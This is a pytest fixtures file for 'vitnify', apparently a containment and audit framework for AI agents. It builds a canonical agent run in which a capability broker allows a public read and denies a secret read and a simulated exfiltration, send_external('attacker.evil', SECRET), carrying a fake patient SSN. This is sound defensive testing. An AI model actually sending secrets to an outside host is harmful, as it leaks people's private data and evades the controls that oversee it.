"""Shared fixtures and helpers for the vitnify test suite.

The canonical run built here mirrors ``examples/attack_matrix.build_run``: a single
model step, one granted tool call (ALLOW), two ungranted tool calls (DENY), and an
entropy draw. Every side-effecting tool routes through the capability Broker, so the
recorded log is exactly what a contained agent run produces.
"""
from __future__ import annotations

import copy

import pytest

from vitnify.events import EventLog, Event, Kind
from vitnify.capability import Broker
from vitnify.certificate import issue_certificate, gen_ed25519

SECRET = "patient_ssn=123-45-6789"
CAPS = {"read_public"}  # only read_public is granted


def make_tools(exfil):
    """Fresh tool table whose side effects append to ``exfil`` (a per-test list)."""
    def read_public(t):
        return f"public::{t}"

    def read_secret():
        return SECRET

    def send_external(dest, data):
        exfil.append((dest, data))
        return "SENT"

    return {"read_public": read_public, "read_secret": read_secret,
            "send_external": send_external}


def build_log(exfil, broker_replay=None):
    """Canonical contained run: llm_call, read_public ALLOW, read_secret DENY,
    send_external DENY, entropy. Mirrors examples/attack_matrix.build_run."""
    log = EventLog()
    log.append(Kind.LLM_CALL, {"prompt_hash": "aa11bb22", "tokens": [471, 263, 4123],
                               "logit_hashes": ["l0aa", "l1bb", "l2cc"]})
    b = Broker(CAPS, make_tools(exfil), log, replay=broker_replay)
    b.call("read_public", "ticket7")                 # ALLOW
    b.call("read_secret")                            # DENY (ungranted)
    b.call("send_external", "attacker.evil", SECRET)  # DENY (ungranted)
    log.append(Kind.ENTROPY, {"source": "rng", "value": "0x1234"})
    return log


def clone(log):
    """Deep, independent copy of a log (mutating the clone never touches the source)."""
    return EventLog.from_events(
        [Event(e.i, e.kind, copy.deepcopy(e.payload), e.prev) for e in log.events])


def tool_idx(log, tool, decision):
    """Index of the first tool_call event matching (tool, decision)."""
    for k, e in enumerate(log.events):
        if (e.kind == Kind.TOOL_CALL.value
                and e.payload["tool"] == tool and e.payload["decision"] == decision):
            return k
    raise KeyError((tool, decision))


@pytest.fixture
def ed_keys():
    """A fresh ed25519 keypair: (private_key, public_key_hex)."""
    return gen_ed25519()


@pytest.fixture
def exfil():
    """A per-test capture list for send_external side effects (empty == contained)."""
    return []


@pytest.fixture
def agent_log(exfil):
    """A pristine canonical contained run."""
    return build_log(exfil)


@pytest.fixture
def signed(agent_log, ed_keys):
    """(cert, log, priv, pub, cas) for the canonical run, ed25519-signed."""
    priv, pub = ed_keys
    cert, cas = issue_certificate("vitnify-agent-v1", CAPS, agent_log, priv=priv)
    return cert, agent_log, priv, pub, cas
